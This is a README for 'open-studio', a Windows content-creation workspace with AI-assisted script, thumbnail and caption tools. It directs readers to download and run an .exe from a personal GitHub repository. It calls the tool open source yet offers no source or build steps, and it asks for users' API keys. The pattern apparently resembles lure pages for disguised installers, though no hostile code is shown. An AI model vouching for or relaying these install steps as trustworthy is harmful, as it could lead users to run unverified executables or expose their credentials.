# 🚀 open-studio - Build your creator content with ease

[![Download Open-Studio](https://img.shields.io/badge/Download-OpenStudio-blue.svg)](https://github.com/Andreluemb4311/open-studio)

Open-studio is a workspace for digital creators. It helps you manage your workflow from the first spark of an idea to the final video upload. You can write scripts, generate thumbnails, draft captions, and research hashtags in one place. This tool connects to different AI providers to help you create better content in less time.

## 📥 How to install the software

You need to download the installer to your computer. Follow these steps to get started:

1. Visit the [official download page here](https://github.com/Andreluemb4311/open-studio).
2. Look for the latest release version on the right side of the page.
3. Select the file ending in `.exe` to download it.
4. Open the downloaded file once the process finishes.
5. Follow the prompts on your screen to complete the installation.

Once the process finishes, an icon will appear on your desktop. Double-click this icon to open your workspace.

## 🖥️ System requirements

Open-studio runs on Windows computers. Make sure your system meets these standards for the best results:

* Operating System: Windows 10 or Windows 11.
* Processor: Intel Core i5 or AMD Ryzen 5 or better.
* Memory: 8 gigabytes of RAM or more.
* Storage: 500 megabytes of free space.
* Internet Connection: Stable connection for AI features and cloud saving.

## 🛠️ Main features

The workspace includes tools for every stage of your content creation.

### Script writing
The script editor helps you organize your video ideas. You can use integrated AI tools to expand your notes into full scripts. This saves you time during the writing phase. You can also track your progress as you move from outline to final draft.

### Thumbnail creation
Design thumbnails that attract attention. The workspace includes templates to help you structure your images. You can generate art ideas based on your video description. This ensures your thumbnails match the content of your videos.

### Caption and hashtag generation
Writing captions for social media platforms takes effort. Open-studio creates captions based on your script content. It suggests relevant hashtags to help more people find your videos. You can review and edit these suggestions before you copy them for your upload.

### Multi-provider support
The tool connects to several AI services. You choose which service provides the best results for your needs. This flexibility ensures you always have access to the latest generation models.

## 💡 How to use the workspace

The workspace layout is simple. You see a dashboard when you open the application. 

### Starting a new project
Click the "New Project" button at the top of the interface. Give your project a name. This creates a folder where all your notes, scripts, and images reside for that specific video.

### Editing scripts
Open your project folder and select "Script." Type your notes into the document area. When you need help, click the "AI Assist" button to generate text based on your points. You can change the tone of the writing in the settings menu.

### Managing assets
Every image you generate stays in the "Assets" tab. You can drag and drop these images into your design software or download them for your final project.

## ❓ Frequently asked questions

### Do I need to be a programmer?
No. You do not need to know how to write code. The installer manages the technical setup for you.

### Is the software free?
The software is open-source. You can use it without paying for a license.

### Where does my data stay?
All your work stays on your local machine. You own your scripts and images.

### Can I upgrade the AI models?
Yes. You can manage your API keys within the settings page. This allows you to connect your own paid accounts to the application if you want to use advanced models.

### Does it work offline?
Some features require an internet connection to reach AI servers. Basic editing works without an active connection.

## 🧪 Troubleshooting

If the software does not open, try these steps:

1. Restart your computer. 
2. Make sure you have the latest version installed.
3. Check your internet connection for the AI features.
4. Ensure your computer meets the system requirements listed above.

If you encounter errors during installation, verify that you have permission to install programs on your computer. Some work or school computers restrict installations. Contact your system administrator if the issue continues.

## ⚙️ Configuration settings

You can change how the software functions in the Settings menu. 

* Language options: Choose your preferred display language.
* AI providers: Enter your unique API keys here to enable content generation.
* Auto-save: Enable this feature to keep your work safe.
* File location: Choose where the software stores your project data.

The software saves these settings automatically. You only need to configure them once during your first run.
